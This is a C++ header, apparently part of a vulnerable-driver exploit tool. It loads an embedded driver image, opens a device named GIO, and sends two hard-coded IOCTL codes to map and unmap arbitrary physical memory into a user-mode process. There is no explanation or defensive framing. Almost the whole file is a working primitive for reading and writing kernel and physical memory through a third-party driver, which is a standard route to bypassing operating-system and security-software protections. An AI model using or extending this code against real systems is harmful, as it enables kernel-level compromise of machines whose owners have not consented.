#pragma once
#include <windows.h>
#include <mutex>
#include <cstdint>
#include <map>

#include "../util/util.hpp"
#include "../loadup.hpp"
#include "../raw_driver.hpp"

#pragma pack ( push, 1 )
typedef struct _GIOMAP
{
	unsigned long	interface_type;
	unsigned long	bus;
	std::uintptr_t  physical_address;
	unsigned long	io_space;
	unsigned long	size;
} GIOMAP;
#pragma pack ( pop )

namespace nasa
{
	inline std::string drv_key;
	inline HANDLE drv_handle = NULL;
	inline std::vector<std::pair<std::uintptr_t, std::uint32_t >> virtual_mappings;

	inline bool load_drv()
	{
		const auto [result, key] =
			driver::load(
				i6::raw_driver,
				sizeof(i6::raw_driver)
			);

		drv_key = key;
		drv_handle = CreateFile(
			"\\\\.\\GIO",
			GENERIC_READ | GENERIC_WRITE,
			NULL,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);
		return drv_handle;
	}

	inline bool unload_drv()
	{
		return CloseHandle(drv_handle) && driver::unload(drv_key);
	}

	inline std::uintptr_t map_phys(
		std::uintptr_t addr,
		std::size_t size
	)
	{
		GIOMAP in_buffer = { 0, 0, addr, 0, size };
		uintptr_t out_buffer[2] = { 0 };
		unsigned long returned = 0;
		DeviceIoControl(drv_handle, 0xC3502004, reinterpret_cast<LPVOID>(&in_buffer), sizeof(in_buffer),
			reinterpret_cast<LPVOID>(out_buffer), sizeof(out_buffer), &returned, NULL);

		virtual_mappings.emplace_back(std::pair<std::uintptr_t, std::size_t>(out_buffer[0], size));
		return out_buffer[0];
	}

	inline bool unmap_phys(
		std::uintptr_t addr,
		std::size_t size
	)
	{
		uintptr_t in_buffer = addr;
		uintptr_t out_buffer[2] = { sizeof(out_buffer) };

		unsigned long returned = NULL;
		DeviceIoControl(drv_handle, 0xC3502008, reinterpret_cast<LPVOID>(&in_buffer), sizeof(in_buffer),
			reinterpret_cast<LPVOID>(out_buffer), sizeof(out_buffer), &returned, NULL);
		return out_buffer[0];
	}

	inline void unmap_all()
	{
		__try
		{
			for (auto idx = 0u; idx < virtual_mappings.size(); ++idx)
				unmap_phys(virtual_mappings[idx].first, virtual_mappings[idx].second);
		}
		__except (EXCEPTION_ACCESS_VIOLATION) {}
	}
}